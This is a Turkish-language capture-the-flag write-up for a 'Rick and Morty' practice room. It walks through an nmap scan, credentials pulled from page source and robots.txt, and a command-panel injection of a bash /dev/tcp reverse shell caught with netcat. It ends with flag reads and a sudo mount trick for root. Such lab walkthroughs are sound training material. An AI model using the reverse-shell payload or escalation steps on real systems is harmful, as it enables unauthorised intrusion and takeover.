======================================================|
RİCK AND MORTY CTF                                    |
============================================================================|
 ____  ___ ____ _  __     _    _   _ ____    __  __  ___  ____ _______   _  |
|  _ \|_ _/ ___| |/ /    / \  | \ | |  _ \  |  \/  |/ _ \|  _ \_   _\ \ / / |
| |_) || | |   | ' /    / _ \ |  \| | | | | | |\/| | | | | |_) || |  \ V /  |
|  _ < | | |___| . \   / ___ \| |\  | |_| | | |  | | |_| |  _ < | |   | |   |
|_| \_\___\____|_|\_\ /_/   \_\_| \_|____/  |_|  |_|\___/|_| \_\|_|   |_|   |
                                                                            |
============================================================================|
TARAMA                                                                      |
                                                                            |
Hedef üzerinde nmap taraması yapıyporuz                                     |
                                                                            |
nmap <ip>                                                                   |
                                                                            |
HTTP 80 /open                                                               |
SSH  80 /open                                                               |
============================================================================|
 Sitenin kodlarının içinde  username buluyoruz                 |
                                                               |
Username: R1ckRul3s => kullanıcı adı bulundu                   |
                                                               |
robots.txt Wubbalubbadubdub => robots.txt içinde bulunan yazı  |
                                                               |
 dirbuster ile tarama yapıyoruz                                |
                                                               |
http://thm.lab/login.php => Login sayfası bulundu              |
                                                               |
===============================================================|
login.php                        |
                                 |
Kulanıcı adı : R1ckRul3s         |
Şifre        : Wubbalubbadubdub  |
                                 |
==================================================================================|
ERİŞİM ELEDE ETME                                                                 |
                                                                                  |
nc -lnvp 12345 => kendi cihazımda netcat açtım                                    |
                                                                                  |
Sitede panelinde bulunan command yerine payloadı yazıyorum                        |                                                                               
                                                                                  | 
/bin/bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1' => payloadı enjekte etim |
                                                                                  |
 www-data@ip**.**.**.**:/var/www/html$ => shell açılıdı                           |
==================================================================================|
FLAG = 1                                                                       |
                                                                               |
Dizin ls yaptığımzıda Sup3rS3cretPickl3Ingred.txt dosyasını görüyoruz          |
                                                                               |
cat Sup3rS3cretPickl3Ingred.txt => "*** ******* ****"                          |
==========================================================================================================|
aynı yerde bulunan Clue.txt dosyasyında                                                                   |
                                                                                                          |
Look around the file system for the other ingredient. => Diğer içeriklere bakmamızı söyleyen txt dosyası  |
                                                                                                          |
==========================================================================================================|
FLAG = 2                                                       |
                                                               |
cd /home/rick Dosyasnıa giriyoruz                              |
                                                               |
ls yaptığımızda "second ingredients" diye dosyayı görüyoruz    |
                                                               |
cat "second ingredients" => * ***** ****                       |
===============================================================|
YETKİ YÜKSELTME                                                |
                                                               |
sudo mount -o bind /bin/sh /bin/mount                          |                  
sudo mount => İle root haklarına sahip oldum                   |
                                                               |
===============================================================|
FLAG = 3                                                       |
                                                               |
cd /root/ Dosyasının içinde 3rd.txt buluyoruz                  |
                                                               |
***** *****                                                    |
===============================================================|
                               |
 _____ ___ _   _ ____  _   _   |
|  ___|_ _| \ | / ___|| | | |  |
| |_   | ||  \| \___ \| |_| |  |
|  _|  | || |\  |___) |  _  |  |
|_|   |___|_| \_|____/|_| |_|  |
                               |
===============================| 
















